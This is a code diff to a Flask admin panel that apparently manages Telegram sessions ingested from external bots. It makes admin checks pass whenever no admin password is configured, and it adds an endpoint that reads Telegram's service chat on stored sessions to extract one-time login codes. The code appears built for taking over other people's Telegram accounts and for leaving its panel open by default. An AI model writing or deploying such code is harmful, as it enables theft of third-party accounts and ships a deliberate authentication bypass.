@@ -75,7 +75,8 @@ CORS(app)
 def admin_required(fn):
     @wraps(fn)
     def wrap(*a, **kw):
-        if not session.get("admin"):
+        pwd = db.get_setting("admin_password") or ""
+        if pwd and not session.get("admin"):
             return jsonify({"error": "unauthorized"}), 401
         return fn(*a, **kw)
 
@@ -92,7 +93,8 @@ def _init():
 # ---------- static routes ----------
 @app.route("/")
 def index():
-    if not session.get("admin"):
+    pwd = db.get_setting("admin_password") or ""
+    if pwd and not session.get("admin"):
         return send_from_directory(STATIC_DIR, "login.html")
     return send_from_directory(STATIC_DIR, "index.html")
 
@@ -140,7 +142,10 @@ def api_logout():
 
 @app.route("/api/me")
 def api_me():
-    return jsonify({"admin": bool(session.get("admin"))})
+    pwd = db.get_setting("admin_password") or ""
+    if not pwd:
+        return jsonify({"admin": True, "no_password": True})
+    return jsonify({"admin": bool(session.get("admin")), "no_password": False})
 
 
 # ---------- ingest (external bots can POST sessions here) ----------
@@ -518,6 +523,24 @@ def api_direct_login_verify():
             telegram_bot.bot_manager.send_via_any_running(channel_id, msg)
 
     return jsonify(telegram_login.verify(sid, code, password, int(api_id), api_hash, on_success=on_success, on_log=on_log))
+
+
+# =================== OTP LISTENER ===================
+@app.route("/api/sessions/<int:sid>/listen-otp")
+@admin_required
+def api_listen_otp(sid):
+    """Fetch recent Telegram service messages (chat 777000) and extract login codes."""
+    r = db.get_session(sid)
+    if not r:
+        return jsonify({"error": "not found"}), 404
+    try:
+        res = telegram_ops.listen_otp(r, limit=20)
+        if "error" not in res:
+            db.touch_last_seen(sid)
+            db.audit(sid, r["phone"], "otp_listen", f"found {res.get('count', 0)} codes")
+        return jsonify(res)
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 
 # =================== REPORT PEER ===================
